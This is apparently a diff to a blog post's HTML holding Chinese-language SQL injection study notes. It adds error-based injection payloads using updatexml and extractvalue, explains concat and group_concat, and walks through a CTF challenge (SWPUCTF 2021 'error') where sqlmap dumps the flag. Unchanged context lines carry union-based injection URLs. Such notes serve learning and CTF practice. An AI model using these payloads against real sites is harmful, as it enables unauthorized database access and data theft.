@@ -94,7 +94,7 @@
 <li>获取数据</li>
 </ul>
 <p><code>sqlmap -u &quot;http://172.16.1.116/?id=1&quot; --batch -D 数据库名 -T 表名 -C 字段1,字段2…… --dump</code></p>
-<h2 id="Tamper脚本"><a href="#Tamper脚本" class="headerlink" title="Tamper脚本"></a>Tamper脚本</h2><h1 id="function"><a href="#function" class="headerlink" title="function"></a>function</h1><ul>
+<h1 id="function"><a href="#function" class="headerlink" title="function"></a>function</h1><ul>
 <li><code>1&#39; or true;#</code></li>
 <li><code>1 or true;#</code></li>
 <li><code>1||true</code>  <code>1||Flase</code></li>
@@ -147,14 +147,53 @@
 <h5 id="常用函数"><a href="#常用函数" class="headerlink" title="常用函数"></a>常用函数</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">system_user() → 系统用户名</span><br><span class="line">user() → 用户名</span><br><span class="line">current_user → 当前用户名</span><br><span class="line">session_user() → 连接数据库的用户名</span><br><span class="line">databases() → 数据库名</span><br><span class="line">version() → 数据库版本</span><br><span class="line">load_file() → 读取本地文件的函数</span><br><span class="line">@@datadir → 读取数据库路径</span><br><span class="line">@@basedir → 安装路径</span><br><span class="line">@@version_compile_os → 操作系统</span><br><span class="line">left() → 从左侧开始指定字符个数的字符串</span><br><span class="line">concat() → 没有分隔符的连接字符串</span><br><span class="line">concat_ws() → 含有分割符的连接字符串</span><br><span class="line">group_concat() → 连接一个组的字符串</span><br><span class="line">ascii() → 返回ASCII码</span><br><span class="line">hex() → 将字符串转换为十六进制</span><br><span class="line">md5() → 返回MD5值</span><br></pre></td></tr></table></figure>
 
 <h5 id="注入-1"><a href="#注入-1" class="headerlink" title="注入"></a>注入</h5><ul>
+<li>报错注入</li>
+</ul>
+<ol>
+<li>特定函数的报错注入</li>
+</ol>
+<p>extractvalue()和updatexml()函数</p>
+<blockquote>
+<p>extractvalue() 函数原理： extractvalue(xml_frag, xpath_expr) 函数接收两个参数，一个是XML文档片段，另一个是XPath表达式。正常情况下，这个函数会根据给定的XPath路径从XML文档中提取数据。然而，当XPath表达式构造不当，例如包含了非法字符或者尝试执行一个无法解析为有效XPath表达式的字符串时，函数会抛出错误，并且错误信息可能包含有关查询的信息，这便为报错注入提供了机会。攻击者可以通过精心构造的XPath表达式来触发错误，进而获取数据库敏感信息。</p>
+</blockquote>
+<blockquote>
+<p>updatexml() 函数原理： updatexml(xml_target, xpath_expr, new_value) 也接受三个参数，同样与XML和XPath相关。它试图根据XPath表达式定位到XML文档中的某个节点并用new_value替换该节点的内容。如果XPath表达式被设计成无法解析或指向无效位置，那么这个函数也会产生错误。通过控制XPath字符串内容，攻击者能够引起特定类型的错误，这些错误消息中可能携带了关于数据库表结构或数据的信息。<br>在报错注入攻击中，利用这两个函数的关键在于：<br><code>构造一个会导致函数内部发生错误的输入。 利用错误回显机制，通过分析错误消息推断数据库结构或内容。</code></p>
+</blockquote>
+<p>综合使用：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">报错注入（updatexml）</span><br><span class="line">id=1’ and updatexml(1,concat(0x7e,database()),1)#</span><br><span class="line">id=1’ and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database())),1)# </span><br><span class="line">id=1&#x27; and updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=&#x27;test_tb&#x27;)),1)# </span><br><span class="line">报数据一：id=1&#x27; and updatexml(1,concat(0x7e,(select group_concat(id,&#x27;~&#x27;,flag) from test_tb)),1)#</span><br><span class="line">爆数据二：?id=1&#x27;and(select updatexml(1,concat(0x7e,(select group_concat(COLUMN_NAME)from TABLE_NAME),0x7e),1))#</span><br><span class="line">报错注入（extractvalue）：</span><br><span class="line">id=1’ and extractvalue(1,concat(0x7e,(select database()))) # </span><br><span class="line">id=1’ and extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database())))# </span><br><span class="line">id=1’ and extractvalue(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=‘test_tb’)))# </span><br><span class="line">id=1’ and extractvalue(1,concat(0x7e,(select group_concat(id,‘~’,flag) from test_tb)))#</span><br></pre></td></tr></table></figure>
+<ul>
 <li>整形注入</li>
 </ul>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"># 寻找注入点</span><br><span class="line">http://172.16.1.116/index.php?id=1</span><br><span class="line"></span><br><span class="line"># 判断虚拟表列数 </span><br><span class="line">http://172.16.1.116/index.php?id=1 order by 1</span><br><span class="line">http://172.16.1.116/index.php?id=1 order by 4</span><br><span class="line">http://172.16.1.116/index.php?id=1 order by 5</span><br><span class="line"># 确定列数为4</span><br><span class="line"></span><br><span class="line"># 查看回显位置</span><br><span class="line">http://172.16.1.116/index.php?id=-1 union select 1,2,3,4 #</span><br><span class="line"></span><br><span class="line"># 查询数据库</span><br><span class="line">http://129.168.1.1/?id=-1 union select 1,2,schema_name,4 from information_schema.schemata limit 0,1</span><br><span class="line">http://129.168.1.1/?id=-1 union select 1,2,schema_name,4 from information_schema.schemata limit 1,2</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># 查询指定数据库中的表</span><br><span class="line">http://129.168.1.1/?id=-1 union select 1,2,table_name,4 from information_schema.tables where table_schema=&#x27;数据库名&#x27; limit 0,1</span><br><span class="line"></span><br><span class="line"># 查询指定表中字段名</span><br><span class="line">http://129.168.1.1/?id=-1 union select 1,2,column_name,4 from informtion_schema.columns where table_schema=&#x27;数据库名&#x27; and table_name=&#x27;表名&#x27; limit 0,1</span><br><span class="line"></span><br><span class="line"># 倒出数据(查看数据库数据)</span><br><span class="line">http://129.168.1.1/?id=-1 union select 1,2,字段名,4 from 数据库名.表名</span><br><span class="line"></span><br></pre></td></tr></table></figure>
 
 <ul>
-<li>使用group_concat()函数</li>
+<li>使用group_concat()函数和concat()</li>
 </ul>
+<blockquote>
+<p>group_concat函数和concat函数介绍：<br>CONCAT() 函数用于将一个或多个字符串连接成一个新的字符串。它可以接受任意数量的参数，并将这些参数按顺序拼接起来。<br>SELECT CONCAT(‘Hello’, ‘ ‘, ‘World’) AS result; 将返回 ‘Hello World’。<br>GROUP_CONCAT() 函数在SQL查询中对属于同一分组的所有行的某一列值进行合并，结果是一个字符串，其中包含所有行该列值的串联，每个值之间可以由指定的分隔符隔开。<br>group_concat()函数则是查询时按照某个特定字段进行分组并select查询，如下：</p>
+</blockquote>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">SELECT department_id, GROUP_CONCAT(id SEPARATOR &#x27;,&#x27;) AS employee_ids</span><br><span class="line">FROM employees</span><br><span class="line">GROUP BY department_id;</span><br></pre></td></tr></table></figure>
+
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"># 查询所有数据库</span><br><span class="line">http://129.168.1.1/?id=-1 union select 1,2,group_concat(schema_name),4 from information_schema.schemata</span><br><span class="line"></span><br><span class="line"># 查询指定数据库中的所有表</span><br><span class="line">http://129.168.1.1/?id=-1 union select 1,2,group_concat(table_name),4 from information_schema.tables where table_schema=&#x27;数据库名&#x27;</span><br><span class="line"></span><br><span class="line"># 查询指定表中所有字段名</span><br><span class="line">http://129.168.1.1/?id=-1 union select 1,2,group_concat(column_name),4 from information_schema.columns where table_schema=&#x27;数据库名&#x27; and table_name=&#x27;表名&#x27;</span><br><span class="line"></span><br><span class="line">#查看数据库数据</span><br><span class="line">http://129.168.1.1/?id=-1 union select 1,2,字段名,4 from 数据库名.表名</span><br></pre></td></tr></table></figure>
+
+<h5 id="sqlmap简单的使用"><a href="#sqlmap简单的使用" class="headerlink" title="sqlmap简单的使用"></a>sqlmap简单的使用</h5><p>题目：nsscft [SWPUCTF 2021 新生赛]error</p>
+<p><img src="https://cdn.jsdelivr.net/gh/Daylovef/image/image/dongman/20240413121633.png" alt="20240413121633"></p>
+<p>直接就给了sql的语句</p>
+<p>sqlmap一把梭<br>先获取数据库名</p>
+<p><code>sqlmap -u &#39;http://node4.anna.nssctf.cn:28070/?id=1&#39; --batch --dbs</code></p>
+<p><img src="https://cdn.jsdelivr.net/gh/Daylovef/image/image/dongman/20240413122708.png" alt="20240413122708"></p>
+<p>再获取表名<br><code>sqlmap -u &#39;http://node4.anna.nssctf.cn:28070/?id=1&#39; --batch -D test --tables </code></p>
+<p>在获取列名<br><code>sqlmap -u &#39;http://node4.anna.nssctf.cn:28070/?id=1&#39; --batch -D test_db -T test_tb -column</code></p>
+<p>最后获取字段<br><code>sqlmap -u &#39;http://node4.anna.nssctf.cn:28070/?id=1&#39; --batch -D test_db -T test_tb -C flag --dump</code><br><img src="https://cdn.jsdelivr.net/gh/Daylovef/image/image/dongman/20240413124214.png" alt="20240413124214"></p>
+<p>当然也可以自己去尝试报错注入。</p>
+<p><img src="https://cdn.jsdelivr.net/gh/Daylovef/image/image/dongman/20240413122914.png" alt="20240413122914"></p>
+<p>但是这里的报错有字符限制，所以我们使用substring来对字段进行截取</p>
+<p><img src="https://cdn.jsdelivr.net/gh/Daylovef/image/image/dongman/20240413124003.png" alt="20240413124003"></p>
+<p>payload：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27; and updatexml(1,concat(0x7e,(select substring((select group_concat(id,&#x27;~&#x27;,flag) from test_tb),20))),1)--+</span><br><span class="line"></span><br><span class="line">?id=1&#x27; and updatexml(1,concat(0x7e,(select group_concat(id,&#x27;~&#x27;,flag) from test_tb)),1)--+</span><br></pre></td></tr></table></figure>
+
+
+
 
                 
                 <p class="end">__END__</p>
